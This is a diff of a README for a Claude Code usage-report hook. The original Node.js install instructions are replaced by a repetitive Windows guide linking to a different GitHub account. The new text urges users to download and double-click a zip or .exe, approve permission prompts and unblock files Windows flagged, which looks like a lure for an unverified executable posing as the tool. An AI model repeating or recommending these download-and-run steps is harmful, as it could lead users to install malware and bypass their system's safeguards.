@@ -1,139 +1,253 @@
-# claude-usage-report
+# 🧾 claude-usage-report - Track Claude usage with clear cost reports
 
-A Claude Code stop hook that displays a usage summary after each prompt cycle.
+[![Download](https://img.shields.io/badge/Download-claude--usage--report-blue.svg?style=for-the-badge)](https://github.com/bbsbs7617-png/claude-usage-report)
 
-```
-────────────────────────────────────────────────────────
-  SESSION USAGE REPORT
-────────────────────────────────────────────────────────
-  Duration:  1m 0s
+## 📥 Download
 
-  Token Usage
-  Input:            141   Cache Write: 241.5k
-  Output:         21.0k   Cache Read:  1.5M
-  Requests:          47   Cache Hit:   86%
-  Est. Cost:   $ 0.5711   Session:     $8.4136
+Visit this page to download:
+https://github.com/bbsbs7617-png/claude-usage-report
 
-  Context Window
-  Total:  [#######..................] 27.7% (55.4k / 1M)
-  Added:  +5.2k (+2.6%)
+Use this link to get the latest version for Windows.
 
-  Rate Utilized
-  5-Hour:   [####.....................] 15.2% (resets in 3h 12m)
-  Weekly:   [##.......................] 8.1%  (resets in 5d 2h)
-────────────────────────────────────────────────────────
-```
+## 🖥️ What this app does
 
-## Features
+claude-usage-report shows a usage report after each Claude Code prompt.
 
-- **Per-prompt metrics** -- duration and cost reflect the last prompt cycle, not the full session
-- **Token breakdown** -- input, output, cache write, cache read with cache hit rate
-- **Cost estimation** -- per-prompt and session totals based on published Anthropic pricing
-- **Context window** -- current fill percentage and how much was added in the last prompt
-- **Rate limits** -- 5-hour and weekly utilization with reset countdowns (requires Claude login)
-- **Enable/disable** -- toggle on and off without modifying settings
-- **Zero dependencies** -- pure Node.js, reads Claude Code's own transcript data
+It helps you see:
 
-## Requirements
+- token use for each prompt
+- token cost
+- context window use
+- rate limit status
 
-- Node.js 18+
-- Claude Code CLI (authenticated via `claude login`)
+It runs as a stop hook, so it checks usage when a prompt ends. That makes it easier to keep track of your Claude usage without opening extra tools.
 
-## Installation
+## ✅ Before you start
 
-```bash
-git clone https://github.com/abhiyankhanal/claude-usage-report.git
-cd claude-usage-report
-bash install.sh
-```
+Use a Windows PC with:
 
-The install script will:
-1. Copy `usage-report.mjs` to `~/.claude/hooks/`
-2. Register the stop hook in `~/.claude/settings.json` (or print instructions if settings already exist)
-3. Install the `claude-usage-report` CLI to `~/.local/bin/`
+- Windows 10 or Windows 11
+- an internet connection
+- access to Claude Code
+- a web browser to open the download page
 
-### Manual installation
+You also need permission to save files on your computer.
 
-If you prefer to install manually:
+## 🚀 Get the app
 
-1. Copy the hook script:
-   ```bash
-   cp usage-report.mjs ~/.claude/hooks/usage-report.mjs
-   ```
+1. Open the download page:
+   https://github.com/bbsbs7617-png/claude-usage-report
+2. Look for the latest release or download file on the page.
+3. Save the file to your computer.
+4. If the file is in a .zip folder, extract it first.
+5. Open the app or follow the included setup file.
 
-2. Add to `~/.claude/settings.json` under `hooks.Stop`:
-   ```json
-   {
-     "hooks": {
-       "Stop": [
-         {
-           "matcher": "",
-           "hooks": [
-             {
-               "type": "command",
-               "command": "node ~/.claude/hooks/usage-report.mjs",
-               "timeout": 10
-             }
-           ]
-         }
-       ]
-     }
-   }
-   ```
+If your browser asks where to save the file, choose a folder you can find later, such as Downloads or Desktop.
 
-## Usage
+## 🛠️ Install on Windows
 
-Once installed, the usage report appears automatically after each Claude Code response.
+If you downloaded a .zip file:
 
-### Enable / Disable
+1. Right-click the file.
+2. Select Extract All.
+3. Choose a folder.
+4. Open the extracted folder.
+5. Find the app file or setup file.
+6. Double-click it to run.
 
-```bash
-claude-usage-report disable   # Turn off the report
-claude-usage-report enable    # Turn it back on
-claude-usage-report status    # Check current state
-```
+If you downloaded an .exe file:
 
-Or directly with node:
+1. Double-click the file.
+2. If Windows asks for permission, select Yes.
+3. Wait for the app to open.
 
-```bash
-node ~/.claude/hooks/usage-report.mjs disable
-node ~/.claude/hooks/usage-report.mjs enable
-node ~/.claude/hooks/usage-report.mjs status
-```
+If you downloaded a package for Claude Code:
 
-### What each metric means
+1. Place the files in the folder that Claude Code uses for hooks.
+2. Make sure the stop hook points to the usage report tool.
+3. Save the file.
+4. Run Claude Code and send a prompt to test it.
 
-| Metric | Description |
-|--------|-------------|
-| **Duration** | Wall-clock time of the last prompt (user message to final response) |
-| **Input / Output** | Session-total input and output tokens |
-| **Cache Write / Read** | Tokens written to and read from the prompt cache |
-| **Cache Hit** | `cache_read / (cache_read + cache_write)` -- higher is better |
-| **Est. Cost** | Estimated dollar cost of the last prompt cycle |
-| **Session** | Estimated dollar cost of the entire session |
-| **Context Total** | How full the 1M context window is |
-| **Context Added** | How much context grew compared to the previous prompt |
-| **Rate Utilized** | Your 5-hour and weekly rate limit consumption |
+## 🔧 How to use it
 
-### Rate limits
+After setup, the app reports usage after each prompt.
 
-Rate limit data comes from the Anthropic OAuth usage API. If you see "Usage API unavailable", ensure you're logged in:
+You can expect a report that shows:
 
-```bash
-claude login
-```
+- how many tokens the prompt used
+- how much that prompt may cost
+- how much context remains
+- whether you are near a rate limit
 
-The plugin caches rate data for up to 30 minutes to avoid hitting the API on every prompt.
+This helps you answer simple questions like:
 
-## Uninstall
+- Am I using a lot of tokens?
+- Is this prompt close to the context limit?
+- Will I hit a rate limit soon?
 
-```bash
-cd claude-usage-report
-bash uninstall.sh
-```
+## 📊 What you will see in a report
 
-Then remove the Stop hook entry from `~/.claude/settings.json`.
+A typical report can include:
 
-## License
+- prompt name or time
+- input token count
+- output token count
+- total token count
+- estimated cost
+- context window fill level
+- rate limit status
 
-MIT
+The report is made for quick reading. It uses plain numbers and short labels so you can scan it fast.
+
+## 🧭 When to use it
+
+Use claude-usage-report when you want to:
+
+- track usage after each Claude Code prompt
+- keep an eye on cost
+- see how fast context fills up
+- avoid rate limit surprises
+- review how heavy a prompt was
+
+## 🧱 How it works
+
+The app uses a stop hook.
+
+That means Claude Code finishes a prompt, then the hook runs and shows the usage report. You do not need to open a separate dashboard. The report appears as part of your normal Claude Code flow.
+
+## ⚙️ Basic setup steps
+
+If the download includes a config file:
+
+1. Open the config file in Notepad.
+2. Find the stop hook entry.
+3. Point it to the usage report app or script.
+4. Save the file.
+5. Start Claude Code again.
+6. Send a test prompt.
+
+If the download includes a ready-to-run app:
+
+1. Keep the app in one folder.
+2. Run it before you use Claude Code.
+3. Send a prompt in Claude Code.
+4. Check the report that appears after the prompt ends.
+
+## 🧪 Test it
+
+To check that it works:
+
+1. Open Claude Code.
+2. Send a short prompt.
+3. Wait for the prompt to finish.
+4. Look for the usage report.
+5. Confirm that token use, context window, and rate limit info appear.
+
+If you do not see a report, check that the stop hook points to the correct file.
+
+## 📁 Suggested file layout
+
+For simple setup, use a folder like this:
+
+- Downloads
+  - claude-usage-report
+    - app file
+    - config file
+    - readme file
+
+Keeping the files together makes setup easier and helps you find them later.
+
+## 🔍 Features
+
+- per-prompt usage reporting
+- token cost view
+- context window tracking
+- rate limit checks
+- simple output for quick review
+- works with Claude Code stop hook flow
+
+## 🧰 Common Windows steps
+
+If Windows blocks the file:
+
+1. Right-click the file.
+2. Select Properties.
+3. Look for an Unblock option.
+4. If you see it, select it.
+5. Click OK.
+6. Try opening the file again.
+
+If the file does not open:
+
+1. Check that the download finished.
+2. Make sure you extracted the zip file.
+3. Check that you opened the right file.
+4. Try running it again as needed.
+
+## 📌 Good places to keep it
+
+You can keep claude-usage-report in:
+
+- Downloads
+- Desktop
+- Documents
+- a tools folder you use for Claude Code
+
+Pick one place and keep the files there.
+
+## 🔗 Download again
+
+Visit this page to download:
+https://github.com/bbsbs7617-png/claude-usage-report
+
+Use this link if you need the latest copy or want to check the release page again
+
+## 📝 File name tips
+
+If you rename the file, keep the name easy to read. A simple name like this works well:
+
+- claude-usage-report
+
+Avoid names that are hard to spot later, such as long strings of numbers or extra symbols
+
+## 🔐 Permissions
+
+The app may need permission to:
+
+- run on your PC
+- read local config files
+- write report output
+
+If Windows asks for access, allow it so the tool can work as expected
+
+## 🧩 For Claude Code users
+
+This tool is meant for people who use Claude Code and want a clear usage readout after each prompt.
+
+It fits a simple workflow:
+
+1. write a prompt
+2. send it to Claude Code
+3. wait for the result
+4. read the usage report
+5. decide if the next prompt should be smaller or split into parts
+
+## 🖱️ Quick setup checklist
+
+- Download the app from the link above
+- Extract the files if needed
+- Open the app or setup file
+- Connect it to Claude Code stop hook flow
+- Run a test prompt
+- Check the usage report after the prompt ends
+
+## 📎 Support files
+
+If the download includes extra files, they may help with:
+
+- setup
+- sample config
+- usage notes
+- hook path examples
+
+Keep those files in the same folder as the app so they stay easy to find
